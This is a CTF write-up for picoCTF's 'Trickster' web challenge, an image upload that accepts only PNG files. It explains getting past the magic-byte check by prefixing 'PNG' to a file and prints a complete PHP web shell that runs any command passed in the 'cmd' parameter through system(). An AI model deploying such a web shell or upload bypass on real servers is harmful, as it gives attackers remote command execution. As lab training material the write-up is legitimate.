# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : Trickster
# Descriptio
found a web app that can help process images: PNG images only! Try it
# Information Gathering
Only accepts PNG image files
<img width="1597" height="778" alt="1" src="https://github.com/user-attachments/assets/a6ef4611-48d0-4bb2-873f-83575d57161e" />


When examining the site or reviewing hidden cash files such as robots.txt or instructions.txt, you will discover that the site:
<img width="1591" height="600" alt="2" src="https://github.com/user-attachments/assets/3dde0e02-34be-442d-9191-1ce536344f01" />
Verifies the file's digital signature, or Magic Bytes, to ensure it is a genuine image
<img width="1599" height="781" alt="g" src="https://github.com/user-attachments/assets/67cb3115-011c-4326-9b78-e4d78afbaca6" />

# Crafting the Payload
to bypass filter we need add Magic Bytes to our file ,in our case we can add PNG on first line of file like this
<img width="1598" height="825" alt="5" src="https://github.com/user-attachments/assets/f91fc941-3c75-472d-840f-00b94088b58e" />

     PNG
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
       if(isset($_GET['cmd']))
      {
          system($_GET['cmd'] . ' 2>&1');
      }
    ?>
    </pre>
    </body>
    </html>





